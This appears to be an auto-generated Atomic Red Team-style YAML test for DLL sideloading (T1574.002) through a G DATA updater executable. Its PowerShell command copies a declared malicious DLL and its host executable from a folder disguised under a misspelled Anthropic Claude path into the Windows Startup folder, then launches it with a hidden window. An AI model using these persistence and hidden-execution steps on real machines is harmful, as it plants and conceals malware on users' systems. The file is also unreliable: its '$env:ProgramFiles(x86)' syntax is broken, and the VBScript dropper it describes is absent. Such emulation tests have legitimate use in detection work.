# Auto-generated by CIPHER v5.0
# Source: 14c11153d496
attack_technique: T1574.002
display_name: "T1574.002 - DLL Sideloading via GDATA NOVUpdate.exe"
atomic_tests:
  - name: "T1574.002 - DLL Sideloading via GDATA NOVUpdate.exe"
    description: |
      Deploy a malicious DLL (avk.dll) alongside a signed legitimate executable (NOVUpdate.exe) and trigger hidden execution via a VBScript dropper.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        # 1. Copy malicious files to Startup
        $src = "$env:ProgramFiles(x86)\Anthropic\Claude\Cluade\SquirrelTemp"
        $dst = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        Copy-Item "$src\NOVUpdate.exe" "$dst" -Force
        Copy-Item "$src\avk.dll" "$dst" -Force
        Copy-Item "$src\NOVUpdate.exe.dat" "$dst" -Force
        # 2. Launch hidden
        Start-Process -FilePath "$dst\NOVUpdate.exe" -WindowStyle Hidden
      cleanup_command: |
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\NOVUpdate.exe" -Force
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\avk.dll" -Force
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\NOVUpdate.exe.dat" -Force
